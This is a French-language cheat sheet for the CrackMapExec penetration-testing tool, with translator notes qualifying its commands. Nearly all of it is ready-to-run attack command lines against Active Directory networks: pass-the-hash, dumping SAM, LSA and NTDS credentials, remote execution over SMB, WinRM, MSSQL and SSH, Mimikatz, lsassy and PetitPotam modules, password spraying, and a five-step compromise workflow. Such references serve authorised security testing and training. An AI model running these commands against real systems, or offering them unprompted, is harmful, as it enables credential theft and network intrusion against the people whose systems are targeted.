# 🗡️ CrackMapExec — boîte à outils polyvalente pour Active Directory

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec — outil polyvalent de test d’intrusion
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Table des matières

- [Qu’est-ce que CrackMapExec ?](#-quest-ce-que-crackmapexec-)
- [Installation](#-installation)
- [Protocole SMB](#-protocole-smb)
- [Protocole WinRM](#-protocole-winrm)
- [Protocole LDAP](#-protocole-ldap)
- [Protocole MSSQL](#-protocole-mssql)
- [Protocole SSH](#-protocole-ssh)
- [Modules](#-modules)
- [Essais d’un mot de passe sur plusieurs comptes (password spraying)](#-essais-dun-mot-de-passe-sur-plusieurs-comptes-password-spraying)
- [Base de données](#-base-de-données)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce que CrackMapExec ?

**CrackMapExec** (CME) est un outil de post-exploitation destiné à l’évaluation des réseaux. Il prend en charge :

- 🖥️ **SMB** — Partages, sessions et exécution
- 🔧 **WinRM** — Accès à distance PowerShell
- 📂 **LDAP** — Énumération Active Directory (inventaire des objets et droits)
- 🗄️ **MSSQL** — Attaques sur SQL Server
- 🐧 **SSH** — Cibles Linux
- 💉 **Pass-the-Hash** — Réutilisation d’une empreinte NT pour l’authentification

### Fonctionnalités

| Fonctionnalité | Description |
|---------|-------------|
| **Multiprotocole** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Exécution parallèle** | Opérations sur plusieurs cibles |
| **Base d’identifiants** | Suivi des identifiants compromis |
| **Modules** | Extension avec des modules personnalisés |
| **Formats de sortie** | Plusieurs options de sortie |

---

## 🚀 Installation

> **Version des exemples :** ce guide conserve les noms et commandes historiques de CME. Kali présente désormais NetExec comme sa continuation ; les paquets, lanceurs et modules dépendent de la génération utilisée. Les commandes ne sont pas remplacées automatiquement ([Kali](https://www.kali.org/tools/netexec/)).

### Kali Linux

```bash
# Installer avec apt
sudo apt update
sudo apt install crackmapexec

# Ou avec pipx (recommandé dans l’original)
pipx install crackmapexec
```

### Avec pipx

```bash
# Installer d’abord pipx
sudo apt install pipx
pipx ensurepath

# Installer CME
pipx install crackmapexec
```

### Vérifier l’installation

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a id="-protocole-smb"></a>
## 🖥️ Protocole SMB

### Énumération de base

```bash
# Vérifier si les hôtes répondent
cme smb 10.10.10.0/24

# Énumérer avec des identifiants
cme smb 10.10.10.10 -u user -p password

# Authentification de domaine
cme smb 10.10.10.10 -u user -p password -d domain.local

# Authentification locale
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

### Pass-the-Hash

> **Précision :** le Pass-the-Hash emploie une empreinte NT, pas une réponse NetNTLMv2 capturée sur le réseau. Une authentification réussie ne donne pas automatiquement les droits nécessaires à chaque opération ; les exemples d’exécution et d’extraction exigent les accès et services correspondants ([implémentation SMB](https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/protocols/smb.py)).

```bash
# SMB avec une empreinte NTLM
cme smb 10.10.10.10 -u user -H NTLMHASH

# Empreintes LM:NTLM complètes
cme smb 10.10.10.10 -u user -H LM:NTLM

# Tester l’empreinte sur le réseau
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Énumération des partages

> **Précision :** `--spider-folder` définit un sous-répertoire pour le parcours d’un partage ; seul, ce paramètre ne sélectionne pas le partage à parcourir. L’exemple original est conservé ([options SMB officielles](https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/protocols/smb/proto_args.py)).

```bash
# Lister les partages
cme smb 10.10.10.10 -u user -p password --shares

# Parcourir les partages à la recherche de fichiers
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# Lister les fichiers récursivement
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

### Énumération des utilisateurs

```bash
# Lister les utilisateurs via RPC
cme smb 10.10.10.10 -u user -p password --users

# Lister les groupes
cme smb 10.10.10.10 -u user -p password --groups

# Lister les utilisateurs connectés
cme smb 10.10.10.10 -u user -p password --loggedon-users

# Obtenir les SID des utilisateurs
cme smb 10.10.10.10 -u user -p password --rid-brute
```

### Exécution de commandes

```bash
# Exécuter une commande
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# Exécution PowerShell
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Différentes méthodes d’exécution
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

### Extraction d’identifiants

> **Précision :** « nécessite Domain Admin » est un raccourci : la méthode DRS s’appuie sur les droits de réplication effectifs du domaine, qui peuvent être délégués. La méthode VSS a d’autres prérequis d’accès ; SAM et LSA ne se confondent pas avec une extraction NTDS ([DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync), [méthodes CME](https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/protocols/smb/proto_args.py)).

```bash
# Extraire la SAM
cme smb 10.10.10.10 -u admin -p password --sam

# Extraire les secrets LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# Extraire NTDS.dit (administrateur de domaine sur le DC selon l’original)
cme smb DC01.domain.local -u admin -p password --ntds

# Extraire les données NTDS avec une méthode précise
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

### Signature SMB

> **Précision :** la liste produite repère les hôtes qui n’exigent pas la signature SMB ; elle ne prouve pas qu’un relais complet réussira. Les autres conditions d’authentification et de protocole restent déterminantes ([options CME](https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/protocols/smb/proto_args.py), [Microsoft](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview)).

```bash
# Vérifier la signature SMB pour les attaques par relais
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

## 🔧 Protocole WinRM

### Utilisation de base

```bash
# Vérifier l’accès WinRM
cme winrm 10.10.10.10 -u user -p password

# Vérifier plusieurs cibles
cme winrm 10.10.10.0/24 -u user -p password

# Avec une empreinte
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

### Exécution de commandes

```bash
# Exécuter une commande
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Exécuter un script
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

### Extraction d’identifiants

```bash
# Extraction de la SAM via WinRM
cme winrm 10.10.10.10 -u admin -p password --sam

# Secrets LSA
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

## 📂 Protocole LDAP

> **Version des options :** les options et modules sont propres au protocole et à la version. Par exemple, `--password-policy` ne figure pas dans le parseur LDAP de la source officielle citée ; les commandes historiques ci-dessous ne doivent pas être supposées valides pour toute installation ([parseur LDAP](https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/protocols/ldap/proto_args.py)).

### Énumération

```bash
# Requête LDAP de base
cme ldap DC01.domain.local -u user -p password

# Lister les utilisateurs
cme ldap DC01 -u user -p password --users

# Lister les groupes
cme ldap DC01 -u user -p password --groups

# Utilisateurs exposés à l’AS-REP roasting
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Utilisateurs exposés au Kerberoasting
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

### Politique de mots de passe

```bash
# Obtenir la politique de mots de passe
cme ldap DC01 -u user -p password --password-policy
```

### Attributs des utilisateurs

```bash
# Obtenir les descriptions des utilisateurs
cme ldap DC01 -u user -p password -M get-desc-users

# Obtenir des attributs précis
cme ldap DC01 -u user -p password --admin-count
```

---

<a id="-protocole-mssql"></a>
## 🗄️ Protocole MSSQL

### Utilisation de base

```bash
# Se connecter à MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Authentification Windows
cme mssql 10.10.10.10 -u user -p password -d domain.local

# Avec une empreinte
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

### Exécution de commandes

```bash
# Exécuter via xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Activer d’abord xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Exécuter une commande
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

## 🐧 Protocole SSH

### Utilisation de base

```bash
# Vérification SSH
cme ssh 10.10.10.10 -u root -p password

# Plusieurs cibles
cme ssh 10.10.10.0/24 -u user -p password

# Avec un fichier de clé
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

### Exécution de commandes

```bash
# Exécuter une commande
cme ssh 10.10.10.10 -u root -p password -x "id"

# Plusieurs commandes
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

## 🧩 Modules

### Lister les modules

```bash
# Lister tous les modules
cme smb -L
cme winrm -L
cme ldap -L

# Aide d’un module
cme smb -M mimikatz --options
```

### Modules courants

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (extraction de LSASS)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# Mots de passe GPP
cme smb DC01 -u user -p password -M gpp_password

# Connexion automatique GPP
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

### Collecte pour BloodHound

```bash
# Collecter les données BloodHound
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

## 🔓 Essais d’un mot de passe sur plusieurs comptes (password spraying)

### Essais de base

> **Correction du commentaire original :** avec des fichiers d’utilisateurs et de mots de passe, `--no-bruteforce` associe les lignes correspondantes ; il ne teste pas toutes les combinaisons. `--continue-on-success` poursuit les essais après une réussite, sans neutraliser les politiques de verrouillage ([parseur officiel](https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/cli.py)).

```bash
# Tester un seul mot de passe sur plusieurs utilisateurs
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Plusieurs mots de passe
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Sans force brute (chaque combinaison selon le commentaire original)
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Essais sur le réseau

```bash
# Tester sur le réseau
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# À partir d’un fichier de cibles
cme smb targets.txt -u admin -p password --continue-on-success
```

### Prendre en compte le verrouillage des comptes

```bash
# Vérifier d’abord la politique de mots de passe
cme ldap DC01 -u user -p password --password-policy

# Sortie :
# Minimum password length: 8
# Password history length: 24
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

## 💾 Base de données

### Base de données CME

```bash
# Consulter les identifiants
cmedb

# Dans cmedb :
creds           # Lister les identifiants enregistrés
hosts           # Lister les hôtes analysés
```

### Exporter les données

> **Version des exemples :** le parseur commun cité propose `--log`, mais pas `--json`. L’exemple JSON et les autres options historiques restent inchangés ; vérifier la version et le protocole auxquels ils appartiennent ([source officielle](https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/cli.py)).

```bash
# Formats de sortie
cme smb 10.10.10.10 -u user -p password --log log.txt

# Sortie JSON
cme smb 10.10.10.10 -u user -p password --json
```

---

## 📊 Référence rapide

### Méthodes d’authentification

| Méthode | Option |
|--------|--------|
| Mot de passe | `-p password` |
| Empreinte NTLM | `-H HASH` |
| Clé AES | `--aesKey KEY` |
| Kerberos | `-k` |
| Authentification locale | `--local-auth` |

### Protocoles

| Protocole | Port | Utilisation |
|----------|------|----------|
| SMB | 445 | Partages de fichiers et exécution |
| WinRM | 5985/5986 | Accès à distance PowerShell |
| LDAP | 389/636 | Énumération Active Directory |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Systèmes Linux |

### Options courantes

| Option | Description |
|------|-------------|
| `-u` | Nom d’utilisateur ou fichier de noms |
| `-p` | Mot de passe ou fichier de mots de passe |
| `-H` | Empreinte NTLM |
| `-d` | Domaine |
| `-x` | Commande cmd |
| `-X` | Commande PowerShell |
| `--shares` | Lister les partages |
| `--users` | Lister les utilisateurs |
| `--sam` | Extraire la SAM |
| `--lsa` | Extraire les secrets LSA |
| `--ntds` | Extraire les données NTDS |

### Indicateurs de sortie

> **Précision :** `(Pwn3d!)` reflète le contrôle de privilèges effectué par le protocole ; ce n’est pas une garantie que toutes les commandes suivantes réussiront. Les protections et droits spécifiques peuvent encore limiter une opération ([code de connexion](https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/master/cme/connection.py)).

| Indicateur | Signification |
|--------|---------|
| `[+]` | Réussite |
| `[-]` | Échec |
| `[*]` | Information |
| `(Pwn3d!)` | Droits d’administration détectés selon le contrôle effectué |

### Déroulement habituel

```bash
# 1. Analyse du réseau
cme smb 10.10.10.0/24

# 2. Essais d’un mot de passe sur plusieurs comptes
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Vérifier les droits d’administration
cme smb 10.10.10.0/24 -u user -p password

# 4. Extraire les identifiants
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Utiliser les identifiants découverts
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

## 📚 Ressources

- [CrackMapExec sur GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [Wiki CrackMapExec](https://wiki.porchetta.industries/)
- [Modules CME](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

### Aide-mémoire associés
- [BloodHound](../../BloodHound/translations/README.fr.md)
- [Impacket](../../Impacket/translations/README.fr.md)
- [Mimikatz](../../Mimikatz/translations/README.fr.md)

---

<p align="center">
  <b>🗡️ Maîtrisez l’évaluation du réseau !</b><br>
  <i>CrackMapExec — l’outil polyvalent du pentesteur</i>
</p>
